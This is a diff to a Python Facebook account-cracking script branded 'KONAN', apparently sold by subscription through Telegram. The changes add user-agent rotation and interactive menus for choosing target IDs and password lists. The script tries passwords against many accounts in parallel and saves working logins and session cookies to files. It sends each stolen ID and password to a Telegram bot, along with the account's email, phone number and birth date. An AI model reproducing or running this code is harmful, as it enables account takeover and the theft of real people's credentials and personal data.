@@ -3,7 +3,7 @@ respo = requests.get(f"https://mail.google.com")
 der=respo.headers
 print(der['Date'])
 import time,datetime
-g= datetime.datetime(2024, 2, 7,)
+g= datetime.datetime(2024, 2, 4,)
 x = datetime.datetime.now()
 if (x.strftime("%x"))>(g.strftime("%x")):
  exit('@KO00NAN توقفت الاداة راسل كونان للاشتراك')
@@ -353,6 +353,16 @@ ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
 ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0'
 ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0'
 ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
+ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
+ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0'
+ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
+ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0'
+ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
+ua = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0'
+ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15'
+ua = 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0'
+ua = 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0'
+ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0'
 ###########################################################################################
 tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
@@ -597,69 +607,103 @@ def wdeh_id_public():
 
 
 def setting():
-    hu = '1'
-    if hu in ('3', '03'):
-        for tua in sorted(id):
-            id2.append(tua)
-    elif hu in ('2', '02'):
-        muda = []
-        for bacot in sorted(id):
-            muda.append(bacot)
-        bcm = len(muda)
-        bcmi = bcm - 1
-        for xmud in range(bcm):
-            id2.append(muda[bcmi])
-            bcmi -= 1
-    elif hu in ('1', '01'):
-        for bacot in id:
-            xx = random.randint(0, len(id2))
-            id2.insert(xx, bacot)
-    else:
-        print('>> PILIH YANG BENAR BANG ')
-        exit()
-    hc = '1'
-    if hc in ('1', '01'):
-        method.append('mobile')
-    elif hc in ('',):
-        print('>> PILIH YANG BENAR BANG ')
-        setting()
-    _jembot_ = '2'
-    if _jembot_ in ('',):
-        print('>> Pilih Yang Bener Kontol ')
-        back()
-    elif _jembot_ in ('2', '2'):
-        taplikasi.append('ya')
-    else:
-        taplikasi.append('no')
-    pwplus = '1'
-    if pwplus in ('2', '2'):
-        pwpluss.append('ya')
-        cetak(nel('[[cyan]•[green]] يمكنك وضع باسورد واحد فقط\n[[cyan]•[green]] Contoh :[green] 123456qwerty[green] '))
-        pwku = input('>>ادخل الباسورد : ')
-        pwkuh = pwku.split(',')
-        for xpw in pwkuh:
-            pwnya.append(xpw)
-    else:
-        passwrd()
-         
+	print(f'{x}>> 1. Old Account : صيد حسابات قديمه ')
+	print('>> 2. New Account : صيد حسابات جديده ')
+	print('')
+	hu = input('>> Chose : ')
+	if hu in ['1','01']:
+		for tua in sorted(id):
+			id2.append(tua)
 
+	elif hu in ['2','02']:
+		muda=[]
+		for bacot in sorted(id):
+			muda.append(bacot)
+		bcm=len(muda)
+		bcmi=(bcm-1)
+		for xmud in range(bcm):
+			id2.append(muda[bcmi])
+			bcmi -=1
+#	elif hu in ['3','03']:
+#		for bacot in id:
+#			xx = random.randint(0,len(id2))
+#			id2.insert(xx,bacot)
+	else:
+		print('>> PILIH YANG BENAR BANG ')
+		exit()
+	print('>> 1. Mobile ')
+#    print('>> 2. Mbasic ')
+#    print('>> 3. Touch  ')
+#    print('>> 4. Mtouch ')
+	print('')
+	hc = input('>> Chose : ')
+	if hc in ['1','01']:
+		method.append('mobile')
+	elif hc in ['']:
+		print('>> PILIH YANG BENAR BANG ')
+		setting()
+#	elif hc in ['2','02']:
+#		method.append('free')
+#	elif hc in ['3','03']:
+#		method.append('touch')
+	elif hc in ['4','04']:
+		method.append('mbasic')
+	else:
+		method.append('mobile')
+	print('')
+	_jembot_ = input('>> Add App : اظهار التطبيقات المرتبطه ( Y/t ) ')
+	if _jembot_ in ['']:
+		print('>> Pilih Yang Bener Kontol ')
+		back()
+	elif _jembot_ in ['y','Y']:
+		taplikasi.append('ya')
+	else:
+		taplikasi.append('no')
+	pwplus=input('>> Password Manual :( Y باسورد يدوي) (T عشوائي) ( Y/t ) ')
+	if pwplus in ['y','Y']:
+		pwpluss.append('ya')
+		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
+		pwku=input('>> Masukkan Password Tambahan : ')
+		pwkuh=pwku.split(',')
+		for xpw in pwkuh:
+			pwnya.append(xpw)
+	else:
+	    passwrd()
+    
 # WORDLIST
 def passwrd():
     clear()
-    print(f'''\033[2;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━             
-        
+    print(f'''\033[2;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                     
 
-
-██╗░░██╗░█████╗░███╗░░██╗░█████╗░███╗░░██╗        
-██║░██╔╝██╔══██╗████╗░██║██╔══██╗████╗░██║        
-█████═╝░██║░░██║██╔██╗██║███████║██╔██╗██║        
-██╔═██╗░██║░░██║██║╚████║██╔══██║██║╚████║        
-██║░╚██╗╚█████╔╝██║░╚███║██║░░██║██║░╚███║        
-╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚══╝        
-
-
-                
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ''')     
+         ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶¶¶¶11111111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶1111111111111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶1111111¶¶¶¶¶¶¶¶111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶11111111¶¶¶111¶¶¶¶¶¶¶1111111¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶1111111111¶¶¶1111111111111111111¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶111111111111¶¶¶¶1111111111¶¶¶¶¶¶1¶¶¶¶¶1¶¶¶
+         ¶¶111111111111111111111111111¶¶111111111111¶¶
+         ¶¶111111111111111111111111111111111111111111¶
+         ¶1111¶¶¶¶1111111111111111111111111111111111¶¶
+         ¶11¶¶¶¶¶111111111111111111111111111¶¶¶¶¶¶11¶¶
+         ¶1¶¶¶¶¶111111111111111111111111111¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶11111111111¶11111111111111¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶111111111111¶¶1111111111111¶¶¶¶¶¶¶¶1¶¶¶
+         ¶¶¶¶¶¶1111111111111¶¶¶111111111111¶¶¶¶¶11¶¶¶¶
+         ¶¶¶¶¶¶1111111¶¶¶11111¶¶¶¶111111111111111¶¶¶¶¶
+         ¶¶¶¶¶¶11111¶¶¶¶¶11111111¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶¶¶
+         ¶¶¶¶¶¶111¶¶¶¶¶¶¶11111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶11111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+         ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+    
+                       
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ''')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf = yuzong.split('|')[0]
@@ -767,7 +811,7 @@ def crack(idf,pwv):
 					ceker(idf,pw)
 				else:
 					print('\n')
-					statuscp = f'''كونان جابلك حساب قافل للاسف❌
+					statuscp = f'''كونان جابلك حساب قافل للاسف❌ 
 
 ✵┈─┈─┈──𓆩KONAN𓆪─┈─┈─┈─✵
 
@@ -795,22 +839,11 @@ Password 🔥 | {pw}
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'''كونان جابلك حساب شغال🔥
-
-✵┈─┈─┈──𓆩KONAN𓆪─┈─┈─┈─✵
-
- ID 🟢 | {idf}
-
-
-Password ✅ | {pw}
-
-✵┈──┈─𓆩۰۪۫K۰۰۪۫O۰۰۪۫N۰۰۪۫A۪۫۰۰۪۫N۰𓆪─┈┈─┈✵
-رسلي صور الصيد حب
-➩ @KO00NAN | @G_R_7N'''
+					#statusok = 
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
-					cek_KONAN(kuki)
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					cek_KONAN(kuki)
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -843,11 +876,7 @@ Password ✅ | {pw}
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += f'''كونان جابلك حساب شغال🔥
-✵┈─┈─┈──𓆩KONAN𓆪─┈─┈─┈─✵
-❖ - ID 🟢 : {idf}\n❖ - Password 🔥 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n✵┈──┈─𓆩۰۪۫K۰۰۪۫O۰۰۪۫N۰۰۪۫A۪۫۰۰۪۫N۰𓆪─┈┈─┈✵
- رسلي صور الصيد حب
-➩ @KO00NAN | @G_R_7N'''
+					#infoakun += 
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
 
 					hit1, hit2 = 0,0
@@ -878,13 +907,15 @@ Password ✅ | {pw}
 								hit2+=1
 					else:pass
 					print('\n')
-					statusok = f'''					
-   \n{infoakun}					
-					'''
+					statusok = f'''كونان جابلك حساب شغال🔥
+✵┈─┈─┈──𓆩KONAN𓆪─┈─┈─┈─✵
+❖ - ID 🟢 : {idf}\n❖ - Password 🔥 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n✵┈──┈─𓆩۰۪۫K۰۰۪۫O۰۰۪۫N۰۰۪۫A۪۫۰۰۪۫N۰𓆪─┈┈─┈✵
+ رسلي صور الصيد حب
+➩ @KO00NAN | @G_R_7N'''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
-					cek_KONAN(kuki)
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					cek_KONVIP(kuki)
 					break
 
 
@@ -893,8 +924,9 @@ Password ✅ | {pw}
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
+
 	
-def cek_KONAN(kuki):
+def cek_KONVIP(kuki):
     session = requests.Session()
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
     sop = BeautifulSoup(w,"html.parser")
@@ -920,6 +952,8 @@ def cek_KONAN(kuki):
             print('\r%s  \x1b[0m            →  %s' % (P, game[i].replace('Kedaluwarsa', ' Kedaluwarsa')))
     except:
         print('\r    %s \x1b[0mcookie invalid' % M)	
+
+
 
 #-----------------------[ KONAN ]--------------------#
 if __name__=='__main__':
